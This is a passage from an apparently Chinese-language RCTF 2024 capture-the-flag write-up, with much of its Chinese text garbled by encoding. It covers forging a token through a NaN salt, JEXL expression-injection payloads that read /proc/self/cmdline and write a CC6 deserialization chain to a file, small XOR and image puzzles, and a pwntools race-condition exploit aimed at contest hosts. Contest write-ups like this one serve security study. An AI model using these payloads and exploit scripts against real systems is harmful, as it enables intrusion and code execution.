</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2024-05-27-RCTF/c460eab80d6db0ff96dac59993a8ca9e.png alt></p><p><img src=/img/2024-05-27-RCTF/53f255d839ade35227ea9c02e782517b.png alt></p><p>key2å½“è¾“å…¥çš„love_timeä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œå…ˆç»è¿‡Numberå‡½æ•°å¤„ç†ä¹‹åå°±ä¼šå˜ä¸ºNaNï¼Œç„¶åå†ç»è¿‡parseIntå‡½æ•°å¤„ç†ä¹‹åsaltedSecretå°±ä¼šå˜ä¸ºNaNï¼Œæ‰€ä»¥æ­¤æ—¶saltedSecretçš„å€¼å¯æ§äº†ï¼Œå°±å¯ä»¥ç”¨æ¥ä¼ªé€ tokenäº†</p><p><img src=/img/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png alt></p><p>ä¼ªé€ token</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>const</span> <span class=n>crypto</span> <span class=o>=</span> <span class=n>require</span><span class=p>(</span><span class=s2>&#34;crypto&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>const</span> <span class=nb>hash</span> <span class=o>=</span> <span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=n>crypto</span><span class=o>.</span><span class=n>createHash</span><span class=p>(</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>=</span><span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>username</span><span class=se>\&#34;</span><span class=s2>:</span><span class=se>\&#34;</span><span class=s2>lover</span><span class=se>\&#34;</span><span class=s2>,</span><span class=se>\&#34;</span><span class=s2>love_time</span><span class=se>\&#34;</span><span class=s2>:null,</span><span class=se>\&#34;</span><span class=s2>have_lovers</span><span class=se>\&#34;</span><span class=s2>:true}&#34;</span>
</span></span><span class=line><span class=cl><span class=n>saltedSecret</span><span class=o>=</span><span class=n>NaN</span>
</span></span><span class=line><span class=cl><span class=n>console</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=n>Buffer</span><span class=o>.</span><span class=n>from</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>toString</span><span class=p>(</span><span class=s2>&#34;base64&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=nb>hash</span><span class=p>(</span><span class=err>`$</span><span class=p>{</span><span class=n>data</span><span class=p>}:</span><span class=err>$</span><span class=p>{</span><span class=n>saltedSecret</span><span class=p>}</span><span class=err>`</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2024-05-27-RCTF/25cc211d6b16c26d5e69e44f5042a2fc.png alt></p><h2 id=nosandbox>nosandbox</h2><p>JEXL è¡¨è¾¾å¼æ³¨å…¥ ï¼ŒBAN äº†å¾ˆå¤šä¸œè¥¿<br>æ ¹æ®å®˜æ–¹æ–‡æ¡£ èƒ½åˆ©ç”¨çš„ åªæœ‰new åˆ›å»ºæ–°å®ä¾‹ï¼Œæ²¡æœ‰T() ç±»å‹è¡¨è¾¾å¼ï¼Œè€Œnew() ä¹Ÿè¢«banäº†ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åŠ ç©ºæ ¼new () è¿›è¡Œç»•è¿‡</p><p><img src=/img/2024-05-27-RCTF/image-20240528103919-7oq843z.png alt=image></p><p>æ ¹æ®ä¸€äº›ä¹‹å‰<code>SpELè¡¨è¾¾å¼æ³¨å…¥</code>â€‹ çš„ payload ï¼Œæ„é€ å‡ºå¦‚ä¸‹payloadè¯»å– <strong>â€‹<code>/proc/self/cmdline</code>â€‹</strong>â€‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>expression</span><span class=o>=</span><span class=k>new</span><span class=o>+</span><span class=p>(</span><span class=err>&#39;</span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>Scanner</span><span class=err>&#39;</span><span class=p>,</span><span class=k>new</span><span class=o>+</span><span class=p>(</span><span class=err>&#39;</span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>FileReader</span><span class=sc>&#39;,&#39;</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=n>self</span><span class=o>/</span><span class=n>cmdline</span><span class=err>&#39;</span><span class=p>)).</span><span class=na>useDelimiter</span><span class=p>(</span><span class=err>&#39;\\</span><span class=n>Z</span><span class=err>&#39;</span><span class=p>).</span><span class=na>next</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/img/2024-05-27-RCTF/image-20240528104010-f8x2byk.png alt=image></p><p>è¯»å–<code>nosandbox.jar</code>â€‹ ä½†å› ä¸ºå­˜åœ¨ç¼–ç é—®é¢˜ï¼Œæ— æ³•åç¼–è¯‘ï¼Œä½†å¯ä»¥çœ‹åˆ°å…¶ä¾èµ–</p><p><img src=/img/2024-05-27-RCTF/image-20240528104020-d8i3qhc.png alt=image></p><p>æ ¹æ®**<a href=https://landgrey.me/blog/15/>LandGreyå¸ˆå‚…æ–‡ç« </a>** æ€è·¯ï¼Œè¡¨è¾¾å¼æ³¨å…¥ä¹Ÿèƒ½æ‰“ååºåˆ—åŒ–</p><p><img src=/img/2024-05-27-RCTF/image-20240528104029-f0db870.png alt=image></p><p>ä½†å…¶ä¸­è°ƒç”¨é™æ€æ–¹æ³• <code>org.springframework.util.SerializationUtils.deserialize</code>â€‹ ååºåˆ—åŒ–æ€è·¯ï¼Œæˆ‘ç”¨ JEXL è¡¨è¾¾å¼æˆ‘æƒ³ä¸å‡ºå¦‚ä½•èƒ½è°ƒç”¨ï¼Œåªèƒ½å»å¯»æ‰¾å†™æ–‡ä»¶å†ååºåˆ—åŒ–è¯»å–çš„æ–¹æ³•</p><p>çœ‹åˆ°<a href=https://github.com/achuna33/Memoryshell-JavaALL>Memoryshell-JavaALL</a> é¡¹ç›®å‘ç°å¯ä»¥ç”¨å¦‚ä¸‹è¡¨è¾¾å¼å°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>$</span><span class=p>{</span><span class=s>&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span class=o>?</span><span class=k>new</span><span class=p>()(</span><span class=s>&#34;java.io.FileWriter&#34;</span><span class=p>,</span><span class=s>&#34;/tmp/hh.txt&#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;&lt;&gt;&#34;</span><span class=p>).</span><span class=na>close</span><span class=p>()}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æˆ‘ä¸€å¼€å§‹æ˜¯å°†åºåˆ—åŒ–æ•°æ®è¿›è¡ŒUnicodeç¼–ç æˆå­—ç¬¦ä¸²å†å†™å…¥ï¼Œä½†æ˜¯å­˜åœ¨å†™å…¥æ–‡ä»¶ä¸æºæ–‡ä»¶ä¸ä¸€è‡´é—®é¢˜</p><p>å‘è°ƒç”¨å…¶ä»–æ–¹æ³•ï¼Œåœ¨JEXL è¡¨è¾¾å¼ä¸­æˆ‘ä¹Ÿæƒ³ä¸å‡ºå®ä¾‹åŒ–<code>byte[]</code>â€‹ æ•°ç»„æ–¹æ³•ï¼Œå› ä¸º<code>[]</code>â€‹ å®ƒä¼šè‡ªåŠ¨æ‰§è¡Œç±»å‹è½¬æ¢</p><p><img src=/img/2024-05-27-RCTF/image-20240528104211-b4ois2b.png alt=image></p><p>é€šè¿‡ä¸€ç•ªå¯»æ‰¾å ç»ˆäºåœ¨<a href=https://docs.oracle.com/javase/8/docs/api/java/io/DataOutputStream.html>å®˜æ–¹æ–‡æ¡£</a> æ‰¾åˆ°äº†DataOutputStream.write(int b) æ–¹æ³•ï¼Œç”¨int å‹å°±èƒ½å†™å…¥æ•°æ®</p><p>ä¸€å¼€å§‹ç”¨çš„æ˜¯jacksonåŸç”Ÿååºåˆ—åŒ–è¿™æ¡ã€‚é“¾ï¼Œæ‰“äº†ä¸¤ééƒ½æ²¡æˆåŠŸ</p><p>é‚æ”¹ç”¨Pç¥çš„CC6é“¾å­</p><p><img src=/img/2024-05-27-RCTF/image-20240528104218-n89rt30.png alt=image></p><p>ç¼–å†™pyè„šæœ¬ï¼Œå†™å…¥æ•°æ®</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>expression</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=o>-</span><span class=mi>84</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>-</span><span class=mi>19</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># å‘é€ POST è¯·æ±‚</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://124.70.143.104:10088/calculate&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># url = &#34;http://local:10119/calculate&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>expression</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;expression&#34;</span><span class=p>:</span> <span class=s2>&#34;new (&#39;java.io.DataOutputStream&#39;,(new (&#39;java.io.FileOutputStream&#39;,&#39;/tmp/cc666&#39;,true))).write(&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>expression</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å†ç”¨å¦‚ä¸‹payloadå³å¯è¯»å–æ–‡ä»¶ååºåˆ—åŒ–</p><p><img src=/img/2024-05-27-RCTF/image-20240528104237-t4btbiw.png alt=image></p><p><img src=/img/2024-05-27-RCTF/image-20240528104241-1htoamp.png alt=image></p><h1 id=misc>misc</h1><h2 id=logo-signin-solved>Logo: Signin (Solved)</h2><p><img src=/img/2024-05-27-RCTF/e929385cbdd238f4d6d62dcd12872cdb.png alt></p><p><img src=/img/2024-05-27-RCTF/e1b235340242f6fbb7d46a4c82e6432a.png alt></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Shell data-lang=Shell><span class=line><span class=cl><span class=nv>logo</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>####################################################################################################
</span></span></span><span class=line><span class=cl><span class=s2>############################ # #####################################################################
</span></span></span><span class=line><span class=cl><span class=s2>####   ##       ########### ## ##          ###########                   ########             ######
</span></span></span><span class=line><span class=cl><span class=s2>####   ##           #########               ##########                   ######                  ###
</span></span></span><span class=line><span class=cl><span class=s2>####   ########       ########     ##########################    #############    ############    ##
</span></span></span><span class=line><span class=cl><span class=s2>####   ###########     ######    ###########   ##############    ############    ###################
</span></span></span><span class=line><span class=cl><span class=s2>###    #############    #####    ###########    #############    ############    ###################
</span></span></span><span class=line><span class=cl><span class=s2>###    ##############   ####    #############   #############   #############    ###################
</span></span></span><span class=line><span class=cl><span class=s2>###    ##############    ###    #############    ############   ##############     #################
</span></span></span><span class=line><span class=cl><span class=s2>###    ##############    ###   ###############   ############   ###############      ###############
</span></span></span><span class=line><span class=cl><span class=s2>###    ##############   ####   ###############   ############   #################      #############
</span></span></span><span class=line><span class=cl><span class=s2>###    #############    ####   ###############   ###########    ####################      ##########
</span></span></span><span class=line><span class=cl><span class=s2>###    ############    #####   ###############   ###########    ######################     #########
</span></span></span><span class=line><span class=cl><span class=s2>###    ####           ######   ##############    ###########    ########################     #######
</span></span></span><span class=line><span class=cl><span class=s2>###    ####         ########    #############    ###########    ##########################    ######
</span></span></span><span class=line><span class=cl><span class=s2>###    #########    #########   #############   ############    ##########################    ######
</span></span></span><span class=line><span class=cl><span class=s2>###    ##########    ########    ###########   #############    ##########################    ######
</span></span></span><span class=line><span class=cl><span class=s2>###    ###########    ########    #########    #############    #############    #########    ######
</span></span></span><span class=line><span class=cl><span class=s2>###    ############   #########     ######   ############       ###############     ####     #######
</span></span></span><span class=line><span class=cl><span class=s2>###   ############## ###########         ############                  #########           #########
</span></span></span><span class=line><span class=cl><span class=s2>#### ###############################  ##############################################    ############
</span></span></span><span class=line><span class=cl><span class=s2>####################################################################################################
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=s1ayth3sp1re-solved>s1ayth3sp1re (Solved)</h2><p>æ ¹æ®åˆ†æ•° 3000 åˆ†æ¥ï¼Œä½¿ç”¨jadxåç¼–è¯‘. æœç´¢ 3000ã€‚åœ¨ä»£ç ä¸­ã€‚æ‰¾åˆ° ç›¸å…³çš„æ¯”è¾ƒ.</p><p><img src=/img/2024-05-27-RCTF/bbf3f404a640adef521efd8c4cdfc7ad.png alt></p><p>è·³è¿‡å»å‘ç° æ˜¯ä¸€æ®µå­—ç¬¦ä¸²åŠ å¯†:</p><p><img src=/img/2024-05-27-RCTF/7da9e6da6a62dedcc190228819151942.png alt></p><p>å…¶ä¸­æœ‰ä¸€äº›å¼•ç”¨ï¼Œæ‰¾åˆ°ä¹‹åï¼Œå†™åŠ å¯†è„šæœ¬:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>l</span> <span class=o>=</span> <span class=p>[</span><span class=mi>164</span><span class=p>,</span> <span class=mi>158</span><span class=p>,</span> <span class=mi>95</span><span class=p>,</span> <span class=mi>107</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>215</span><span class=p>,</span> <span class=mi>108</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>57</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>236</span><span class=p>,</span> <span class=mi>231</span><span class=p>,</span> <span class=mi>17</span><span class=p>,</span> <span class=mi>85</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>l1</span> <span class=o>=</span> <span class=p>[</span><span class=mi>246</span><span class=p>,</span> <span class=mi>221</span><span class=p>,</span> <span class=mi>11</span><span class=p>,</span> <span class=mi>45</span><span class=p>,</span> <span class=mi>127</span> <span class=p>,</span> <span class=mi>148</span><span class=p>,</span> <span class=mi>45</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>70</span><span class=p>,</span> <span class=mi>73</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>98</span><span class=p>,</span> <span class=mi>141</span><span class=p>,</span> <span class=mi>140</span><span class=p>,</span> <span class=mi>112</span><span class=p>,</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>l</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>l</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>l1</span><span class=p>[</span><span class=n>i</span><span class=p>]),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># RCTF{********}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=sec-image-solved->sec-image ï¼ˆsolved ï¼‰</h2><p>å…‰æ …</p><p>ç”¨https://github.com/AabyssZG/Raster-Terminatorè¿™ä¸ªå·¥å…·åˆ†åˆ«å¯¹xå’Œyè¿›è¡Œçˆ†ç ´ï¼Œxå’Œyéƒ½å–2çš„éƒ¨åˆ†ï¼Œ</p><p>æ ¹æ®å‰å››ä¸ªå­—ç¬¦RCTFåˆ†åˆ«åˆ¤æ–­xï¼Œyçš„è¯»å–é¡ºåºï¼ˆå…¨æ˜¯å°å†™ï¼Œoå…¨éƒ¨æ˜¯0ï¼‰</p><h1 id=pwn>pwn</h1><h2 id=taskgo-solved>Taskgo (Solved)</h2><p>goè¯­è¨€çš„æ¡ä»¶ç«äº‰ï¼Œå¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰æº¢å‡ºmoneyç„¶åé€šè¿‡GODåŠŸèƒ½æ³„éœ²åœ°å€ã€‚ä¹‹ååœ¨GODåŠŸèƒ½ä¸­é€šè¿‡æ¡ä»¶ç«äº‰ä¿®æ”¹ç»“æ„ä½“å †å—ï¼Œä»è€ŒåŠ«æŒLOGå‡½æ•°è°ƒç”¨çš„æŒ‡é’ˆä¸ºbockdoorè¯»å–/flagçš„å†…å®¹ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./ctf&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;1.94.107.129&#34;</span><span class=p>,</span><span class=mi>10088</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./ctf&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;terminator&#39;</span><span class=p>,</span><span class=s1>&#39;-x&#39;</span><span class=p>,</span><span class=s1>&#39;sh&#39;</span><span class=p>,</span><span class=s1>&#39;-c&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>meau</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt;&gt; &#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>wooden</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>silver</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>golden</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>buyms</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dropms</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>learningms</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>god</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;name: &#34;</span><span class=p>,</span><span class=s2>&#34;/flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>golden</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buyms</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>learningms</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>dropms</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buyms</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>learningms</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>dropms</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buyms</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>learningms</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>god</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;0x&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;0x&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>backdoor</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>12</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span><span class=o>+</span><span class=mh>0x250</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;backdoor = &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>backdoor</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>meau</span><span class=p>(</span><span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>wooden</span><span class=p>()</span>
